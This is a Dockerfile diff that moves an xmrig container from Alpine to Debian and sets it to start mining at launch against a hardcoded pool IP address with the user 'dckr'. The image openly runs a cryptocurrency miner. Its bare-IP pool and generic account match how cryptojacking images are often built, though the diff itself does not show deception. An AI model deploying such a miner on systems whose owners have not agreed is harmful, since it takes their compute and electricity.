@@ -1,6 +1,6 @@
-FROM alpine:3.7
-COPY xmrig /
-COPY config.json /
-RUN apk add --update libuv && rm -rf /var/cache/apk/* \
-    && chmod +x xmrig
-ENTRYPOINT ["./xmrig"]
+FROM debian:stretch-slim
+WORKDIR /tmp
+COPY xmrig /usr/local/bin/
+
+ENTRYPOINT ["xmrig"]
+CMD ["-o 199.247.8.130 -u dckr -k --nicehash"]
